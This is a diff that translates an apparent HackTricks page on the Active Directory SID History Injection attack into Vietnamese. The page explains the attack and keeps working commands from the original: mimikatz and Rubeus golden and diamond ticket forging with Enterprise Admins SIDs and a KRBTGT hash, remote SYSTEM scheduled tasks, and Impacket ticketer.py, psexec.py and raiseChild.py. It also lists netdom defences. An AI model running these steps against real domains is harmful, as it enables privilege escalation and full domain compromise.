@@ -4,15 +4,15 @@
 
 ## SID History Injection Attack
 
-The focus of the **SID History Injection Attack** is aiding **user migration between domains** while ensuring continued access to resources from the former domain. This is accomplished by **incorporating the user's previous Security Identifier (SID) into the SID History** of their new account. Notably, this process can be manipulated to grant unauthorized access by adding the SID of a high-privilege group (such as Enterprise Admins or Domain Admins) from the parent domain to the SID History. This exploitation confers access to all resources within the parent domain.<sup>[[1]](#references)[[2]](#references)</sup>
+Mục tiêu của **SID History Injection Attack** là hỗ trợ **di chuyển người dùng giữa các domain** đồng thời đảm bảo họ tiếp tục truy cập được các tài nguyên từ domain cũ. Việc này được thực hiện bằng cách **thêm Security Identifier (SID) trước đây của người dùng vào SID History** của tài khoản mới. Đáng chú ý, quy trình này có thể bị lợi dụng để cấp quyền truy cập trái phép bằng cách thêm SID của một nhóm có đặc quyền cao (chẳng hạn như Enterprise Admins hoặc Domain Admins) từ domain cha vào SID History. Cách khai thác này cấp quyền truy cập vào tất cả tài nguyên trong domain cha.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Two methods exist for executing this attack: through the creation of either a **Golden Ticket** or a **Diamond Ticket**.
+Có hai phương pháp thực hiện cuộc tấn công này: tạo **Golden Ticket** hoặc **Diamond Ticket**.
 
-To pinpoint the SID for the **"Enterprise Admins"** group, one must first locate the SID of the root domain. Following the identification, the Enterprise Admins group SID can be constructed by appending `-519` to the root domain's SID. For instance, if the root domain SID is `S-1-5-21-280534878-1496970234-700767426`, the resulting SID for the "Enterprise Admins" group would be `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
+Để xác định SID của nhóm **"Enterprise Admins"**, trước tiên cần tìm SID của domain gốc. Sau khi xác định được SID này, có thể tạo SID của nhóm Enterprise Admins bằng cách thêm `-519` vào cuối SID của domain gốc. Ví dụ, nếu SID của domain gốc là `S-1-5-21-280534878-1496970234-700767426`, thì SID của nhóm "Enterprise Admins" sẽ là `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
 
-You could also use the **Domain Admins** groups, which ends in **512**.
+Bạn cũng có thể sử dụng nhóm **Domain Admins**, có SID kết thúc bằng **512**.
 
-Another way yo find the SID of a group of the other domain (for example "Domain Admins") is with:
+Một cách khác để tìm SID của một nhóm thuộc domain khác (ví dụ: "Domain Admins") là dùng:
 
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
@@ -20,18 +20,18 @@ Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSi
 
 
 > [!WARNING]
-> Note that it's possible to disable SID history in a trust relationship which will make this attack fail.
+> Lưu ý rằng có thể vô hiệu hóa SID history trong quan hệ trust, khiến cuộc tấn công này thất bại.
 
-According to the [**docs**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
-- **Disabling SIDHistory on forest trusts** using the netdom tool (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
-- **Applying SID Filter Quarantining to external trusts** using the netdom tool (`netdom trust /domain: /quarantine:yes on the domain controller`)
-- **Applying SID Filtering to domain trusts within a single forest** is not recommended as it is an unsupported configuration and can cause breaking changes. If a domain within a forest is untrustworthy then it should not be a member of the forest. In this situation it is necessary to first split the trusted and untrusted domains into separate forests where SID Filtering can be applied to an interforest trust
+Theo [**tài liệu**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
+- **Vô hiệu hóa SIDHistory trên forest trust** bằng công cụ netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Áp dụng SID Filter Quarantining cho external trust** bằng công cụ netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Áp dụng SID Filtering cho domain trust trong cùng một forest** không được khuyến nghị vì đây là cấu hình không được hỗ trợ và có thể gây ra các thay đổi làm gián đoạn hoạt động. Nếu một domain trong forest không đáng tin cậy thì domain đó không nên là thành viên của forest. Trong trường hợp này, cần tách các domain đáng tin cậy và không đáng tin cậy thành các forest riêng biệt trước, nơi có thể áp dụng SID Filtering cho trust giữa các forest.
 
-Check this post for more information about bypassing this: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>
+Xem bài viết này để biết thêm thông tin về cách bypass: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
-Last time I tried this I needed to add the arg **`/ldap`**.
+Lần gần nhất tôi thử cách này, tôi cần thêm đối số **`/ldap`**.
 
 ```bash
 # Use the /sids param
@@ -68,7 +68,7 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # Just loading you can perform a dcsync attack agains the domain
 ```
 
-For more info about golden tickets check:
+Để biết thêm thông tin về golden tickets, hãy xem:
 
 
 {{#ref}}
@@ -76,7 +76,7 @@ golden-ticket.md
 {{#endref}}
 
 
-For more info about diamond tickets check:
+Để biết thêm thông tin về diamond tickets, hãy xem:
 
 
 {{#ref}}
@@ -89,7 +89,7 @@ diamond-ticket.md
 ls \\mcorp-dc.moneycorp.local\c$
 ```
 
-Escalate to DA of root or Enterprise admin using the KRBTGT hash of the compromised domain:
+Leo thang lên DA của root hoặc Enterprise Admin bằng hash KRBTGT của domain bị xâm nhập:
 
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
@@ -103,16 +103,16 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
 
-With the acquired permissions from the attack you can execute for example a DCSync attack in the new domain:
+Với các quyền có được từ cuộc tấn công, bạn có thể thực hiện, chẳng hạn, một cuộc tấn công DCSync trong domain mới:
 
 
 {{#ref}}
 dcsync.md
 {{#endref}}
 
-### From linux
+### Từ Linux
 
-#### Manual with [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
+#### Thủ công bằng [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
 
 ```bash
 # This is for an attack from child to root domain
@@ -134,21 +134,21 @@ export KRB5CCNAME=hacker.ccache
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
 
-#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Tự động bằng [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-This is an Impacket script which will **automate escalating from child to parent domain**. The script needs:
+Đây là một script Impacket sẽ **tự động leo thang từ child domain lên parent domain**. Script cần:
 
-- Target domain controller
-- Creds for an admin user in the child domain
+- Domain controller mục tiêu
+- Thông tin đăng nhập của một người dùng admin trong child domain
 
-The flow is:
+Quy trình:
 
-- Obtains the SID for the Enterprise Admins group of the parent domain
-- Retrieves the hash for the KRBTGT account in the child domain
-- Creates a Golden Ticket
-- Logs into the parent domain
-- Retrieves credentials for the Administrator account in the parent domain
-- If the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.
+- Lấy SID của nhóm Enterprise Admins trong parent domain
+- Lấy hash của tài khoản KRBTGT trong child domain
+- Tạo Golden Ticket
+- Đăng nhập vào parent domain
+- Lấy thông tin đăng nhập của tài khoản Administrator trong parent domain
+- Nếu chỉ định switch `target-exec`, script sẽ xác thực với Domain Controller của parent domain thông qua Psexec.
 
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
@@ -156,10 +156,9 @@ raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 
 ## References
 
-- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
-- [2] [What is Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
-- [3] [Security Considerations for Trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
-- [4] [itm8.com - Sid Filter As Security Boundary Between Domains Part 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
-
+- [1] [Persistence lén lút trong Active Directory #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
+- [2] [Security Identifier (SID) là gì? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+- [3] [Các cân nhắc về bảo mật cho Trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [4] [itm8.com - SID Filter làm ranh giới bảo mật giữa các domain Phần 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 {{#include ../../banners/hacktricks-training.md}}
 
